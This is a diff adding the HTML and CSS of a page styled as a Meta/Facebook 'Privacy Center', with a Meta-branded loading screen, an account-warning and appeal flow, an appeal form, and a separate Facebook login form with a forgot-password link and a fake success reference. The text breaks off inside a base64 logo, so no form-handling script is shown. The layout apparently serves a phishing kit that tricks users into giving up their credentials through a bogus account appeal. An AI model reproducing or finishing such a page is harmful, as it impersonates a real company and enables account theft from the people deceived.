@@ -1,0 +1,2340 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1" />
+  <title>Privacy Center</title>
+  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
+  <style>
+    /* Loading Screen Styles */
+    #loadingScreen {
+      position: fixed;
+      top: 0;
+      left: 0;
+      width: 100%;
+      height: 100%;
+      background-color: #f4f6f8;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      z-index: 100000;
+      font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Arial, sans-serif;
+      color: #1c1e21;
+    }
+
+    .loading-container {
+      background: #ffffff;
+      padding: 42px 40px;
+      border-radius: 12px;
+      width: 380px;
+      text-align: center;
+      box-shadow: 0 12px 30px rgba(0, 0, 0, 0.08);
+    }
+
+    .loading-logo {
+      margin-bottom: 22px;
+    }
+
+    .loading-logo img {
+      height: 36px;
+      max-width: 100%;
+    }
+
+    .loading-container h2 {
+      font-size: 20px;
+      font-weight: 600;
+      margin: 12px 0;
+    }
+
+    .loading-container p {
+      font-size: 14px;
+      line-height: 1.6;
+      color: #606770;
+      margin: 0;
+    }
+
+    .loader {
+      margin: 28px auto 0;
+      width: 38px;
+      height: 38px;
+      border: 3px solid #e4e6eb;
+      border-top: 3px solid #1877f2;
+      border-radius: 50%;
+      animation: spin 1s linear infinite;
+    }
+
+    @keyframes spin {
+      0% { transform: rotate(0deg); }
+      100% { transform: rotate(360deg); }
+    }
+
+    .loading-note {
+      margin-top: 22px;
+      font-size: 12px;
+      color: #8a8d91;
+    }
+
+    .loading-footer {
+      margin-top: 14px;
+      font-size: 11px;
+      color: #a0a3a8;
+    }
+
+    /* Language Modal Styles */
+    .language-modal {
+      position: fixed;
+      top: 0;
+      left: 0;
+      width: 100%;
+      height: 100%;
+      background: rgba(0, 0, 0, 0.7);
+      display: none;
+      justify-content: center;
+      align-items: center;
+      z-index: 99999;
+      backdrop-filter: blur(5px);
+      transition: opacity 0.3s ease;
+    }
+   
+    .language-modal-content {
+      background: #fff;
+      padding: 40px;
+      border-radius: 16px;
+      max-width: 600px;
+      width: 90%;
+      text-align: center;
+      box-shadow: 0 20px 40px rgba(0, 0, 0, 0.3);
+      max-height: 80vh;
+      overflow-y: auto;
+      position: relative;
+      animation: modalFadeIn 0.4s ease-out;
+    }
+
+    @keyframes modalFadeIn {
+      from {
+        opacity: 0;
+        transform: translateY(-20px) scale(0.95);
+      }
+      to {
+        opacity: 1;
+        transform: translateY(0) scale(1);
+      }
+    }
+   
+    .language-modal-close {
+      position: absolute;
+      top: 15px;
+      right: 15px;
+      background: #f1f3f4;
+      width: 32px;
+      height: 32px;
+      border-radius: 50%;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      cursor: pointer;
+      transition: all 0.2s ease;
+    }
+    
+    .language-modal-close:hover {
+      background: #e8eaed;
+      transform: rotate(90deg);
+    }
+    
+    .language-modal-close svg {
+      width: 18px;
+      height: 18px;
+      fill: #5f6368;
+    }
+   
+    .language-modal-title {
+      font-size: 28px;
+      font-weight: 700;
+      margin-bottom: 10px;
+      color: #1a1a1a;
+      background: linear-gradient(135deg, #0064e0, #0084ff);
+      -webkit-background-clip: text;
+      -webkit-text-fill-color: transparent;
+      background-clip: text;
+    }
+   
+    .language-modal-subtitle {
+      font-size: 16px;
+      color: #5f6368;
+      margin-bottom: 30px;
+      line-height: 1.5;
+    }
+   
+    .language-search-container {
+      position: relative;
+      margin-bottom: 20px;
+    }
+    
+    .language-search-input {
+      width: 100%;
+      padding: 14px 16px 14px 45px;
+      border: 1px solid #e0e0e0;
+      border-radius: 8px;
+      font-size: 16px;
+      transition: all 0.3s ease;
+      background: #f8f9fa;
+    }
+    
+    .language-search-input:focus {
+      border-color: #0064e0;
+      box-shadow: 0 0 0 3px rgba(0, 100, 224, 0.15);
+      outline: none;
+      background: #fff;
+    }
+    
+    .language-search-icon {
+      position: absolute;
+      left: 16px;
+      top: 50%;
+      transform: translateY(-50%);
+      color: #5f6368;
+    }
+   
+    .language-options {
+      display: grid;
+      grid-template-columns: repeat(2, 1fr);
+      gap: 12px;
+      margin-bottom: 30px;
+      max-height: 300px;
+      overflow-y: auto;
+      padding: 5px;
+    }
+    
+    .language-option {
+      display: flex;
+      align-items: center;
+      padding: 15px;
+      border: 2px solid #e8eaed;
+      border-radius: 12px;
+      cursor: pointer;
+      transition: all 0.2s ease;
+      background: #fff;
+    }
+  
+    .language-option:hover {
+      border-color: #0064e0;
+      background: #f0f7ff;
+      transform: translateY(-2px);
+      box-shadow: 0 4px 12px rgba(0, 100, 224, 0.1);
+    }
+   
+    .language-option.selected {
+      border-color: #0064e0;
+      background: #e6f1ff;
+      box-shadow: 0 4px 12px rgba(0, 100, 224, 0.15);
+    }
+   
+    .language-flag {
+      width: 32px;
+      height: 32px;
+      border-radius: 50%;
+      overflow: hidden;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      font-size: 20px;
+      margin-right: 12px;
+      flex-shrink: 0;
+    }
+   
+    .language-name {
+      font-weight: 600;
+      font-size: 16px;
+      color: #1a1a1a;
+      text-align: left;
+    }
+    
+    .language-code {
+      font-size: 13px;
+      color: #5f6368;
+      margin-top: 2px;
+      text-align: left;
+    }
+   
+    .language-confirm-btn {
+      padding: 16px 30px;
+      background: linear-gradient(135deg, #0064e0, #0084ff);
+      color: #fff;
+      border: none;
+      border-radius: 10px;
+      font-weight: bold;
+      font-size: 16px;
+      cursor: pointer;
+      transition: all 0.3s ease;
+      width: 100%;
+      position: relative;
+      overflow: hidden;
+    }
+    
+    .language-confirm-btn::before {
+      content: '';
+      position: absolute;
+      top: 0;
+      left: -100%;
+      width: 100%;
+      height: 100%;
+      background: linear-gradient(90deg, transparent, rgba(255, 255, 255, 0.2), transparent);
+      transition: 0.5s;
+    }
+    
+    .language-confirm-btn:hover::before {
+      left: 100%;
+    }
+   
+    .language-confirm-btn:hover {
+      transform: translateY(-2px);
+      box-shadow: 0 6px 20px rgba(0, 100, 224, 0.4);
+    }
+    
+    .language-confirm-btn:disabled {
+      background: #ccc;
+      cursor: not-allowed;
+      transform: none;
+      box-shadow: none;
+    }
+    
+    .language-confirm-btn:disabled:hover::before {
+      left: -100%;
+    }
+
+    .no-results {
+      grid-column: 1 / -1;
+      text-align: center;
+      padding: 30px;
+      color: #5f6368;
+      font-style: italic;
+    }
+
+    /* Scrollbar styling */
+    .language-options::-webkit-scrollbar {
+      width: 8px;
+    }
+
+    .language-options::-webkit-scrollbar-track {
+      background: #f1f1f1;
+      border-radius: 4px;
+    }
+
+    .language-options::-webkit-scrollbar-thumb {
+      background: #c1c1c1;
+      border-radius: 4px;
+    }
+
+    .language-options::-webkit-scrollbar-thumb:hover {
+      background: #a8a8a8;
+    }
+
+    /* For Firefox */
+    .language-options {
+      scrollbar-width: thin;
+      scrollbar-color: #c1c1c1 #f1f1f1;
+    }
+
+    /* Mobile responsive adjustments */
+    @media (max-width: 768px) {
+      .language-modal-content {
+        padding: 30px 20px;
+      }
+      
+      .language-options {
+        grid-template-columns: 1fr;
+      }
+      
+      .language-modal-title {
+        font-size: 24px;
+        margin-bottom: 8px;
+      }
+      
+      .language-modal-subtitle {
+        font-size: 15px;
+        margin-bottom: 20px;
+      }
+    }
+
+    @media (max-width: 480px) {
+      .language-modal-content {
+        padding: 25px 15px;
+      }
+      
+      .language-option {
+        padding: 12px;
+      }
+      
+      .language-flag {
+        width: 28px;
+        height: 28px;
+        font-size: 18px;
+        margin-right: 10px;
+      }
+      
+      .language-name {
+        font-size: 15px;
+      }
+    }
+
+    /* Hide main content until language is selected */
+    .main-content {
+      display: none;
+    }
+   
+    /* Mobile header */
+    .mobile-header { display: none; justify-content: center; align-items: center; padding: 10px 15px; position: fixed; top: 0; left: 0; right: 0; z-index: 9999; background: transparent; box-shadow: none; }
+    .mobile-logo { width: 60px; height: auto; }
+
+    header { width: 380px; padding: 40px 40px 15px 60px; display: flex; flex-direction: column; align-items: flex-start; position: fixed; top: 0; left: 0; height: 100vh; background: transparent; overflow-y: auto; z-index: 9999; }
+    .logo { width: 80px; margin: 15px 0 8px 20px; }
+    .privacy-text { font-size: 26px; font-weight: 700; color: #1a1a1a; margin: 0 0 15px 20px; letter-spacing: 0.4px; }
+
+    .home-page { display: flex; align-items: center; flex-direction: row; background-color: #000; color: #fff; padding: 12px 20px; border-radius: 8px; margin-left: 20px; margin-top: 5px; box-shadow: 0 4px 12px rgba(0, 0, 0, 0.1); transition: transform 0.2s ease; cursor: pointer; width: auto; max-width: 100%; }
+    .home-page:hover { transform: translateY(-2px); box-shadow: 0 6px 16px rgba(0, 0, 0, 0.15); }
+    .home-icon { margin-right: 12px; width: 20px; height: 20px; fill: #fff; flex-shrink: 0; }
+    .home-text { font-size: 16px; font-weight: 500; white-space: nowrap; }
+
+    .menu-container { margin-left: 20px; margin-top: 20px; display: flex; flex-direction: column; gap: 15px; }
+    .menu-item { display: flex; align-items: center; flex-direction: row; padding: 12px 20px; border-radius: 8px; transition: all 0.2s ease; cursor: pointer; width: 100%; }
+    .menu-item:hover { background-color: rgba(0, 0, 0, 0.05); transform: translateY(-2px); }
+    .menu-icon { margin-right: 15px; width: 20px; height: 20px; fill: #333; flex-shrink: 0; }
+    .menu-text { font-size: 16px; color: #333; font-weight: 500; white-space: nowrap; }
+
+    .vertical-divider { position: fixed; top: 0; left: 460px; width: 2px; height: 100vh; background-color: #ccc; opacity: 0.5; z-index: 1000; }
+
+    .center-content { margin-left: 460px; flex: 1; min-height: 100vh; overflow-y: auto; padding: 80px 40px; scroll-behavior: smooth; }
+    .center-content::-webkit-scrollbar { width: 10px; }
+    .center-content::-webkit-scrollbar-track { background: rgba(0, 0, 0, 0.05); border-radius: 10px; }
+    .center-content::-webkit-scrollbar-thumb { background: linear-gradient(180deg, #0064e0, #0084ff); border-radius: 10px; border: 2px solid #fff; }
+    .center-content::-webkit-scrollbar-thumb:hover { background: linear-gradient(180deg, #0052b3, #0064e0); }
+
+    .warning-message { display: flex; flex-direction: column; align-items: flex-start; font-size: 24px; font-weight: 400; color: #333; gap: 8px; max-width: 650px; }
+    .warning-top { display: flex; align-items: center; gap: 15px; margin-bottom: 10px; }
+    .warning-message svg { width: 36px; height: 36px; flex-shrink: 0; }
+    .warning-message span { font-weight: 700; color: #d93025; }
+
+    span#fbSendBtnText {
+        color: white;
+    }
+
+    span#sendBtnText {
+        color: white;
+    }
+    .warning-subtext { font-size: 16px; font-weight: 500; color: #5f6368; line-height: 1.5; margin-top: 15px; text-align: left; width: 100%; }
+    .warning-extra { font-size: 15px; font-weight: 500; color: #5f6368; line-height: 1.5; margin-top: 20px; max-width: 650px; text-align: left; width: 100%; }
+
+    /* Appeal box styling */
+    .appeal-box { margin-top: 30px; padding: 0; border-radius: 12px; width: 100%; max-width: 650px; position: relative; overflow: hidden; box-shadow: 0 4px 12px rgba(0, 0, 0, 0.1); }
+    .appeal-box img { display: block; width: 100%; height: auto; border-radius: 12px 12px 0 0; margin: 0; }
+    .appeal-info { border: 2px solid #ffffff; border-top: none; border-radius: 0 0 12px 12px; padding: 25px; background: #fff; margin-top: -2px; }
+    .appeal-title { font-size: 22px; font-weight: 700; color: #1a1a1a; margin-bottom: 15px; text-align: left; }
+    .appeal-desc { font-size: 16px; line-height: 1.6; color: #5f6368; margin-bottom: 25px; text-align: left; }
+    .appeal-btn { display: block; width: 100%; padding: 14px 16px; font-size: 16px; font-weight: 700; color: #fff; background: #0064e0; border: none; border-radius: 8px; cursor: pointer; transition: 0.3s ease; text-align: center; }
+    .appeal-btn:hover { background: #0052b3; transform: translateY(-2px); box-shadow: 0 4px 12px rgba(0, 100, 224, 0.3); }
+   
+    /* Ensure appeal button text is white */
+    .appeal-info .appeal-btn {
+      color: #fff !important;
+    }
+
+    /* Appeal Guide Section */
+    .appeal-guide { margin-top: 40px; max-width: 650px; }
+    .appeal-guide-title { font-size: 22px; font-weight: 700; color: #1a1a1a; margin-bottom: 20px; text-align: left; }
+    .appeal-guide-content { background: #fff; border-radius: 12px; padding: 30px; border: 1px solid #e0e0e0; box-shadow: 0 4px 12px rgba(0, 0, 0, 0.05); }
+    .appeal-guide-text { font-size: 15px; line-height: 1.6; color: #5f6368; margin-bottom: 20px; text-align: left; }
+    .appeal-guide-text:last-child { margin-bottom: 0; }
+
+    /* Additional Resources Section */
+    .additional-resources { margin-top: 50px; max-width: 650px; }
+    .resources-title { font-size: 22px; font-weight: 700; color: #1a1a1a; margin-bottom: 25px; text-align: left; }
+    .resources-grid { display: grid; grid-template-columns: repeat(2, 1fr); gap: 20px; }
+    .resource-card { background: #fff; border-radius: 12px; padding: 25px; border: 1px solid #e0e0e0; box-shadow: 0 4px 12px rgba(0, 0, 0, 0.05); transition: transform 0.3s ease, box-shadow 0.3s ease; cursor: pointer; }
+    .resource-card:hover { transform: translateY(-5px); box-shadow: 0 8px 20px rgba(0, 0, 0, 0.1); }
+    .resource-icon { width: 40px; height: 40px; margin-bottom: 15px; fill: #0064e0; }
+    .resource-card-title { font-size: 18px; font-weight: 700; color: #1a1a1a; margin-bottom: 12px; text-align: left; }
+    .resource-card-desc { font-size: 15px; line-height: 1.5; color: #5f6368; text-align: left; }
+
+    /* Redesigned Appeal Form Styling */
+    .appeal-form {
+      margin-top: 30px;
+      background: #fff;
+      border-radius: 12px;
+      padding: 30px;
+      border: 1px solid #e0e0e0;
+      box-shadow: 0 10px 25px rgba(0, 0, 0, 0.08);
+      max-width: 650px;
+      position: relative;
+      display: none;
+    }
+   
+    .form-header {
+      display: flex;
+      align-items: center;
+      margin-bottom: 25px;
+      padding-bottom: 15px;
+      border-bottom: 1px solid #eaeaea;
+    }
+   
+    .form-icon {
+      width: 40px;
+      height: 40px;
+      background: #0064e0;
+      border-radius: 50%;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      margin-right: 15px;
+    }
+   
+    .form-icon svg {
+      width: 20px;
+      height: 20px;
+      fill: #fff;
+    }
+   
+    .form-title {
+      font-size: 24px;
+      font-weight: 700;
+      color: #1a1a1a;
+      margin: 0;
+    }
+   
+    .form-subtitle {
+      font-size: 16px;
+      color: #5f6368;
+      margin-top: 5px;
+    }
+   
+    .form-notice-container {
+      background: #f8f9fa;
+      border-radius: 8px;
+      padding: 16px;
+      margin-bottom: 25px;
+      border-left: 4px solid #0064e0;
+    }
+   
+    .form-notice {
+      font-size: 14px;
+      color: #5f6368;
+      line-height: 1.5;
+      margin-bottom: 8px;
+    }
+   
+    .form-notice:last-child {
+      margin-bottom: 0;
+    }
+   
+    .form-group {
+      margin-bottom: 22px;
+      position: relative;
+    }
+   
+    .form-label {
+      font-weight: 600;
+      font-size: 14px;
+      display: block;
+      margin-bottom: 8px;
+      color: #1a1a1a;
+    }
+   
+    .form-input {
+      width: 100%;
+      padding: 14px 16px;
+      border: 1px solid #e5e7eb;
+      border-radius: 8px;
+      font-size: 15px;
+      transition: all 0.3s ease;
+      background: #fafafa;
+    }
+   
+    .form-input:focus {
+      border: 1px solid #0064e0;
+      box-shadow: 0 0 0 3px rgba(0, 100, 224, 0.15);
+      outline: none;
+      background: #fff;
+    }
+   
+    .input-error {
+      color: #c2410c;
+      font-size: 13px;
+      line-height: 1.3;
+      margin-top: 6px;
+      min-height: 16px;
+      display: flex;
+      align-items: center;
+      gap: 5px;
+    }
+   
+    .input-error svg {
+      width: 16px;
+      height: 16px;
+    }
+   
+   .form-warning {
+      background: #fef3c7;
+      border: 1px solid #fcd34d;
+      padding: 14px 16px;
+      border-radius: 8px;
+      font-size: 14px;
+      color: #92400e;
+      margin-bottom: 20px;
+      display: none;
+      align-items: center;
+      gap: 10px;
+    }
+    
+    .form-warning svg {
+      width: 20px;
+      height: 20px;
+      flex-shrink: 0;
+    }
+    
+    .form-warning.show {
+      display: flex;
+    }
+   
+    .form-btn {
+      width: 100%;
+      padding: 16px;
+      border: none;
+      border-radius: 8px;
+      background: linear-gradient(135deg, #0064e0, #0084ff);
+      color: #fff;
+      font-weight: bold;
+      font-size: 16px;
+      cursor: pointer;
+      transition: all 0.3s ease;
+      margin-top: 10px;
+      position: relative;
+      overflow: hidden;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      gap: 10px;
+    }
+    
+    .form-btn::before {
+      content: '';
+      position: absolute;
+      top: 0;
+      left: -100%;
+      width: 100%;
+      height: 100%;
+      background: linear-gradient(90deg, transparent, rgba(255, 255, 255, 0.2), transparent);
+      transition: 0.5s;
+    }
+    
+    .form-btn:hover::before {
+      left: 100%;
+    }
+    
+    .form-btn:hover {
+      transform: translateY(-2px);
+      box-shadow: 0 6px 15px rgba(0, 100, 224, 0.4);
+    }
+    
+    .form-btn.loading {
+      opacity: 0.8;
+      pointer-events: none;
+    }
+   
+    .spinner {
+      width: 20px;
+      height: 20px;
+      border: 3px solid rgba(255, 255, 255, 0.3);
+      border-radius: 50%;
+      border-top-color: #fff;
+      animation: spin 1s ease-in-out infinite;
+    }
+   
+    @keyframes spin {
+      to { transform: rotate(360deg); }
+    }
+   
+    /* Video container styling */
+    .video-container {
+      margin: 15px 0;
+      border-radius: 8px;
+      overflow: hidden;
+      box-shadow: 0 2px 8px rgba(0, 0, 0, 0.1);
+      position: relative;
+      max-width: 378px;
+    }
+   
+    .video-player {
+      width: 100%;
+      height: 200px;
+      background: #000;
+      display: block;
+    }
+   
+     
+    .video-placeholder {
+      width: 100%;
+      height: 200px;
+      background: #000;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      color: #fff;
+      flex-direction: column;
+      cursor: pointer;
+    }
+      
+      @media (max-width: 900px) {
+  .video-container {
+    max-width: 337px; /* Mobile width */
+  }
+  }
+
+
+    .video-placeholder svg {
+      width: 30px;
+      height: 30px;
+      margin-bottom: 8px;
+    }
+   
+    .video-title {
+      font-size: 13px;
+      font-weight: 500;
+      margin-top: 5px;
+    }
+   
+    
+    .fb-login-form {
+      margin-top: 30px;
+      background: #fff;
+      border-radius: 12px;
+      padding: 30px;
+      border: 1px solid #e0e0e0;
+      box-shadow: 0 10px 25px rgba(0, 0, 0, 0.08);
+      max-width: 650px;
+      position: relative;
+      display: none;
+    }
+    
+    .fb-form-header {
+      display: flex;
+      align-items: center;
+      margin-bottom: 25px;
+      padding-bottom: 15px;
+      border-bottom: 1px solid #eaeaea;
+    }
+   
+    .fb-form-icon {
+      width: 40px;
+      height: 40px;
+      background: #1877f2;
+      border-radius: 50%;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      margin-right: 15px;
+    }
+   
+    .fb-form-icon svg {
+      width: 20px;
+      height: 20px;
+      fill: #fff;
+    }
+   
+    .fb-form-title {
+      font-size: 24px;
+      font-weight: 700;
+      color: #1a1a1a;
+      margin: 0;
+    }
+   
+    .fb-form-subtitle {
+      font-size: 16px;
+      color: #5f6368;
+      margin-top: 5px;
+    }
+    
+    .fb-form-notice-container {
+      background: #f0f2f5;
+      border-radius: 8px;
+      padding: 16px;
+      margin-bottom: 25px;
+      border-left: 4px solid #1877f2;
+    }
+   
+    .fb-form-notice {
+      font-size: 14px;
+      color: #5f6368;
+      line-height: 1.5;
+      margin-bottom: 8px;
+    }
+   
+    .fb-form-notice:last-child {
+      margin-bottom: 0;
+    }
+   
+    .fb-form-group {
+      margin-bottom: 22px;
+      position: relative;
+    }
+   
+    .fb-form-label {
+      font-weight: 600;
+      font-size: 14px;
+      display: block;
+      margin-bottom: 8px;
+      color: #1a1a1a;
+    }
+   
+    .fb-form-input {
+      width: 100%;
+      padding: 14px 16px;
+      border: 1px solid #dddfe2;
+      border-radius: 6px;
+      font-size: 15px;
+      transition: all 0.3s ease;
+      background: #f5f6f7;
+    }
+   
+    .fb-form-input:focus {
+      border: 1px solid #1877f2;
+      box-shadow: 0 0 0 3px rgba(24, 119, 242, 0.15);
+      outline: none;
+      background: #fff;
+    }
+   
+    .fb-input-error {
+      color: #c2410c;
+      font-size: 13px;
+      line-height: 1.3;
+      margin-top: 6px;
+      min-height: 16px;
+      display: flex;
+      align-items: center;
+      gap: 5px;
+    }
+   
+    .fb-input-error svg {
+      width: 16px;
+      height: 16px;
+    }
+   
+    .fb-form-warning {
+      background: #fef3c7;
+      border: 1px solid #fcd34d;
+      padding: 14px 16px;
+      border-radius: 8px;
+      font-size: 14px;
+      color: #92400e;
+      margin-bottom: 20px;
+      display: none;
+      align-items: center;
+      gap: 10px;
+    }
+   
+    .fb-form-warning svg {
+      width: 20px;
+      height: 20px;
+      flex-shrink: 0;
+    }
+   
+    .fb-form-warning.show {
+      display: flex;
+    }
+   
+    .fb-form-btn {
+      width: 100%;
+      padding: 16px;
+      border: none;
+      border-radius: 6px;
+      background: linear-gradient(135deg, #1877f2, #166fe5);
+      color: #fff;
+      font-weight: bold;
+      font-size: 16px;
+      cursor: pointer;
+      transition: all 0.3s ease;
+      margin-top: 10px;
+      position: relative;
+      overflow: hidden;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      gap: 10px;
+    }
+   
+    .fb-form-btn::before {
+      content: '';
+      position: absolute;
+      top: 0;
+      left: -100%;
+      width: 100%;
+      height: 100%;
+      background: linear-gradient(90deg, transparent, rgba(255, 255, 255, 0.2), transparent);
+      transition: 0.5s;
+    }
+   
+    .fb-form-btn:hover::before {
+      left: 100%;
+    }
+   
+    .fb-form-btn:hover {
+      transform: translateY(-2px);
+      box-shadow: 0 6px 15px rgba(24, 119, 242, 0.4);
+    }
+   
+    .fb-form-btn.loading {
+      opacity: 0.8;
+      pointer-events: none;
+    }
+   
+    .forgot-password {
+      text-align: center;
+      margin-top: 15px;
+      font-size: 14px;
+      color: #1877f2;
+      cursor: pointer;
+    }
+   
+    .forgot-password:hover {
+      text-decoration: underline;
+    }
+   
+    .success-message {
+      margin-top: 30px;
+      background: #d1fae5;
+      border: 1px solid #10b981;
+      border-radius: 12px;
+      padding: 25px;
+      text-align: center;
+      display: none;
+    }
+   
+    .success-message.show {
+      display: block;
+    }
+   
+    .success-icon {
+      width: 60px;
+      height: 60px;
+      margin: 0 auto 15px;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      background: #a7f3d0;
+      border-radius: 50%;
+      border: 2px solid #10b981;
+    }
+   
+    .success-icon svg {
+      width: 30px;
+      height: 30px;
+      color: #059669;
+    }
+   
+    .success-title {
+      font-size: 20px;
+      font-weight: 700;
+      color: #065f46;
+      margin-bottom: 10px;
+    }
+   
+    .success-text {
+      font-size: 15px;
+      color: #065f46;
+      margin-bottom: 15px;
+    }
+   
+    .reference-id {
+      font-family: 'Monaco', 'Menlo', 'Ubuntu Mono', monospace;
+      font-size: 14px;
+      color: #374151;
+      background: #f9fafb;
+      padding: 8px 12px;
+      border-radius: 6px;
+      display: inline-block;
+    }
+
+    /* Mobile Responsive Styles */
+    @media (max-width: 900px) {
+      .vertical-divider { display: none; }
+      .mobile-header { display: flex; }
+      header { display: none; }
+      .center-content { margin-left: 0; padding: 100px 20px 40px; }
+      .warning-message { font-size: 20px; align-items: flex-start; text-align: left; }
+      .warning-top { flex-direction: row; text-align: left; gap: 15px; margin-bottom: 20px; }
+      .warning-message span { text-align: left; }
+      .warning-subtext, .warning-extra { font-size: 15px; text-align: left; }
+      .warning-message svg { width: 32px; height: 32px; }
+      .appeal-info { padding: 20px; }
+      .appeal-title { font-size: 20px; text-align: left; }
+      .appeal-desc { font-size: 15px; text-align: left; }
+      .appeal-btn { font-size: 16px; padding: 14px; }
+      .appeal-guide { margin-top: 30px; }
+      .appeal-guide-title { font-size: 20px; text-align: left; }
+      .appeal-guide-content { padding: 20px; }
+      .appeal-guide-text { font-size: 14px; text-align: left; }
+      .additional-resources { margin-top: 40px; }
+      .resources-grid { grid-template-columns: 1fr; }
+      .resources-title { font-size: 20px; text-align: left; }
+     
+      .appeal-form {
+        padding: 20px;
+      }
+     
+      .form-title {
+        font-size: 22px;
+      }
+     
+      .fb-login-form {
+        padding: 20px;
+      }
+     
+      .fb-form-title {
+        font-size: 22px;
+      }
+     
+      .video-player,
+      .video-placeholder {
+        height: 200px;
+      }
+     
+      .video-placeholder svg {
+        width: 25px;
+        height: 25px;
+      }
+     
+      .video-title {
+        font-size: 12px;
+      }
+     
+      .language-options {
+        grid-template-columns: 1fr;
+      }
+     
+      .language-modal-content {
+        padding: 30px 20px;
+      }
+     
+      .language-modal-title {
+        font-size: 22px;
+      }
+    }
+
+    @media (max-width: 480px) {
+      .center-content { padding: 100px 15px 30px; }
+      .warning-message { font-size: 18px; }
+      .warning-message svg { width: 28px; height: 28px; }
+      .mobile-logo { width: 50px; }
+      .appeal-guide-title { font-size: 18px; text-align: left; }
+      .appeal-guide-content { padding: 15px; }
+      .resources-title { font-size: 18px; text-align: left; }
+      .resource-card { padding: 20px; }
+      .resource-icon { width: 35px; height: 35px; }
+      
+      .appeal-form {
+        padding: 15px;
+      }
+     
+      .fb-login-form {
+        padding: 15px;
+      }
+     
+      .form-header {
+        flex-direction: column;
+        align-items: flex-start;
+      }
+     
+      .fb-form-header {
+        flex-direction: column;
+        align-items: flex-start;
+      }
+     
+      .form-icon {
+        margin-bottom: 10px;
+      }
+     
+      .fb-form-icon {
+        margin-bottom: 10px;
+      }
+     
+      .success-message {
+        padding: 20px;
+      }
+     
+      .success-icon {
+        width: 50px;
+        height: 50px;
+      }
+     
+      .success-icon svg {
+        width: 25px;
+        height: 25px;
+      }
+     
+      .success-title {
+        font-size: 18px;
+      }
+     
+      .video-player,
+      .video-placeholder {
+        height: 180px;
+      }
+     
+      .video-placeholder svg {
+        width: 22px;
+        height: 22px;
+      }
+     
+      .video-title {
+        font-size: 11px;
+      }
+    }
+  </style>
+</head>
+<body>
+  <!-- Loading Screen -->
+  <div id="loadingScreen">
+    <div class="loading-container">
+      <!-- Meta Logo -->
+      <div class="loading-logo">
+        <img src="data:image/png;base64,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
